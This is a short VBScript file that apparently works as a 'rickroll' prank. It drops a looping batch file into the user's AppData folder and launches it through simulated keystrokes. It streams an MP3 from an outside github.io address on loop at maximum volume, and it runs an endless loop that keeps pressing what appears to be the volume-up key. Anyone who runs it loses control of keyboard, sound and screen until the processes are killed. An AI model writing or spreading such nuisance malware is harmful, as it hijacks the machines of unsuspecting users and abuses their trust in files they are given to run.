set w=createobject("wscript.shell")
set p=createobject("wmplayer.ocx")
x=w.expandenvironmentstrings("%appdata%")
set f=createobject("scripting.filesystemobject").createtextfile(x&"\c.bat",true)
f.write"@echo off"&vbcrlf&"cls"&vbcrlf&"color a"&vbcrlf&":1"&vbcrlf&"echo|set/p=""rickrolled  """&vbcrlf&"goto 1"
f.close
w.sendkeys"{f11}%appdata%\c.bat{enter}"
p.url="https://botssd.github.io/b/r.mp3"
p.settings.setmode"loop",true
p.settings.volume=100
while true
wscript.sleep 1
w.sendkeys chr(&haf)
wend
